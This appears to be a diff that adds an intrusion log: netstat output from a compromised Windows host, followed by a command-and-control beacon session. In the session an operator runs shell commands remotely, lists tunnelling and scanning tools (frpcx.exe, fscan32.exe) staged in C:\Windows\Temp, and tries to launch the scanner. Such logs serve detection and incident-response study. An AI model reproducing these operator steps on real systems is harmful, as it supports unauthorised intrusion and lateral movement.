+  TCP    0.0.0.0:2111           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2184           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2190           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2191           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2192           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2193           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2194           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2195           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2196           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2198           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2199           0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       1636
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2632
+  TCP    0.0.0.0:5800           0.0.0.0:0              LISTENING       2140
+  TCP    0.0.0.0:5900           0.0.0.0:0              LISTENING       2140
+  TCP    0.0.0.0:8001           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8095           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:8211           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9002           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9003           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9011           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9991           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9992           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:21535          0.0.0.0:0              LISTENING       1392
+  TCP    0.0.0.0:65535          0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:135          127.0.0.1:1621         ESTABLISHED     760
+  TCP    127.0.0.1:1025         127.0.0.1:1622         ESTABLISHED     508
+  TCP    127.0.0.1:1055         0.0.0.0:0              LISTENING       3052
+  TCP    127.0.0.1:1215         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:1433         127.0.0.1:1523         ESTABLISHED     1580
+  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       1580
+  TCP    127.0.0.1:1523         127.0.0.1:1433         ESTABLISHED     1760
+  TCP    127.0.0.1:1524         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:1621         127.0.0.1:135          ESTABLISHED     1580
+  TCP    127.0.0.1:1622         127.0.0.1:1025         ESTABLISHED     1580
+  TCP    127.0.0.1:4031         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:4032         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:4217         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:4220         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:4611         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:4613         127.0.0.1:1433         TIME_WAIT       0
+  TCP    127.0.0.1:5152         0.0.0.0:0              LISTENING       1416
+  TCP    127.0.0.1:21826        0.0.0.0:0              LISTENING       148
+  TCP    127.0.0.1:39487        0.0.0.0:0              LISTENING       148
+  TCP    192.168.5.15:80        192.168.5.1:6953       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:6999       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:8187       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:8191       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:9101       CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:12141      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:16369      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:17085      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:19419      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:21029      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:21061      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:21635      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:22553      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:25229      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:25711      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:27951      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:32221      CLOSE_WAIT      4
+  TCP    192.168.5.15:80        192.168.5.1:62139      CLOSE_WAIT      4
+  TCP    192.168.5.15:139       0.0.0.0:0              LISTENING       4
+  TCP    192.168.5.15:3389      192.168.5.138:61056    ESTABLISHED     2632
+  TCP    192.168.5.15:3518      192.168.1.60:445       TIME_WAIT       0
+  TCP    192.168.5.15:3805      192.168.1.60:445       TIME_WAIT       0
+  TCP    192.168.5.15:4022      192.168.5.107:445      ESTABLISHED     4
+  TCP    192.168.5.15:4200      192.168.1.60:445       TIME_WAIT       0
+  TCP    192.168.5.15:4286      192.168.1.60:445       TIME_WAIT       0
+  TCP    192.168.5.15:4372      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4387      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4396      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4407      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4420      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4497      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4506      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4520      192.168.1.60:445       FIN_WAIT_2      148
+  TCP    192.168.5.15:4656      192.168.1.99:445       SYN_SENT        148
+  UDP    0.0.0.0:445            *:*                                    4
+  UDP    0.0.0.0:500            *:*                                    508
+  UDP    0.0.0.0:1434           *:*                                    1856
+  UDP    0.0.0.0:1701           *:*                                    4
+  UDP    0.0.0.0:3456           *:*                                    1392
+  UDP    0.0.0.0:4500           *:*                                    508
+  UDP    127.0.0.1:123          *:*                                    868
+  UDP    127.0.0.1:1057         *:*                                    884
+  UDP    127.0.0.1:1058         *:*                                    884
+  UDP    127.0.0.1:1114         *:*                                    868
+  UDP    127.0.0.1:3456         *:*                                    1392
+  UDP    192.168.5.15:123       *:*                                    868
+  UDP    192.168.5.15:137       *:*                                    4
+  UDP    192.168.5.15:138       *:*                                    4
+
+
+02/04 10:50:56 UTC [input] <karson> dir
+02/04 10:50:56 UTC [error] Unknown command: dir
+02/04 10:51:02 UTC [input] <karson> shell dir
+02/04 10:51:02 UTC [task] <T1059> Tasked beacon to run: dir
+02/04 10:51:02 UTC [checkin] host called home, sent: 34 bytes
+02/04 10:51:03 UTC [output]
+received output:
+ Volume in drive C is Local Disk
+ Volume Serial Number is D150-1FD0
+
+ Directory of C:\Windows\Temp
+
+02/04/2024  06:47 PM    <DIR>          .
+02/04/2024  06:47 PM    <DIR>          ..
+04/27/2018  09:32 AM    <DIR>          EUSQLMDB
+04/27/2018  09:32 AM    <DIR>          EUTBPOLICY
+04/27/2018  09:32 AM    <DIR>          EUTBSCH
+02/04/2024  05:07 PM         9,107,456 frpcx.exe
+02/04/2024  06:47 PM         5,490,176 fscan32.exe
+07/18/2012  09:54 AM    <DIR>          hsperfdata_SYSTEM
+11/14/2010  03:00 AM    <DIR>          KB2416472_10.0.30319
+04/15/2011  03:01 AM    <DIR>          KB2446708_10.0.30319
+08/17/2011  07:56 PM    <DIR>          KB2473228_10.0.30319
+08/17/2011  07:53 PM    <DIR>          KB2487367_10.0.30319
+08/17/2011  07:49 PM    <DIR>          KB2518870_10.0.30319
+08/17/2011  07:43 PM    <DIR>          KB2539636_10.0.30319
+03/12/2012  07:07 PM    <DIR>          KB2633870_10.0.30319
+09/27/2010  03:22 PM    <DIR>          sophos_autoupdate1.dir
+05/07/2018  01:51 PM             1,093 tmp1DFD.tmp
+07/20/2018  04:47 PM    <DIR>          vmware-temp
+04/27/2018  10:50 AM    <DIR>          _isTmp_{8675309}
+               3 File(s)     14,598,725 bytes
+              16 Dir(s)  24,286,507,008 bytes free
+
+
+02/04 10:51:42 UTC [input] <karson> shell ./fscan.exe
+02/04 10:51:42 UTC [task] <T1059> Tasked beacon to run: ./fscan.exe
+02/04 10:51:42 UTC [checkin] host called home, sent: 54 bytes
+02/04 10:51:42 UTC [output]
+received output:
+'.' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+02/04 10:51:52 UTC [input] <karson> shell ./fscan32.exe
+02/04 10:51:52 UTC [task] <T1059> Tasked beacon to run: ./fscan32.exe
+02/04 10:51:53 UTC [checkin] host called home, sent: 44 bytes
+02/04 10:51:53 UTC [output]
+received output:
+'.' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+02/04 10:52:04 UTC [input] <karson> shell fscan32.exe
+02/04 10:52:04 UTC [task] <T1059> Tasked beacon to run: fscan32.exe
+02/04 10:52:04 UTC [checkin] host called home, sent: 54 bytes
+02/04 10:53:06 UTC [input] <karson> shell fscan32.exe -h
+02/04 10:53:06 UTC [task] <T1059> Tasked beacon to run: fscan32.exe -h
+02/04 10:53:06 UTC [checkin] host called home, sent: 45 bytes
